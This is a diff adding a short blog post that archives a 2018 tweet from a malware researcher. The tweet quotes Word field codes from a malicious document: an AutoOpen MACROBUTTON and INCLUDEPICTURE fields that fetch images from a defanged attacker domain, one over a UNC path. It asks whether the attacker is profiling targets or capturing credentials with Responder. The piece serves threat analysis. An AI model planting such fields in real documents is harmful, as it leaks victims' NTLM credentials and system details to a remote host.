@@ -1,0 +1,11 @@
+---
+layout: post
+title: Nick Carr
+date: 2018-07-20 03:00:21
+tourl: https://t.co/mZbXbe0al0
+tags: [Responder]
+---
+@DissectMalware MACROBUTTON AutoOpen  INCLUDEPICTURE "hxxps://secureaccess-se2[.]com/images/footer.jpg" \d \* MERGEFORMAT   INCLUDEPICTURE "\\\\secureaccess-se2[.]com/logos/penelope.jpg" \d \* MERGEFORMAT
+
+^similar to document profilers used by others
+Attacker watching logs or running responder?
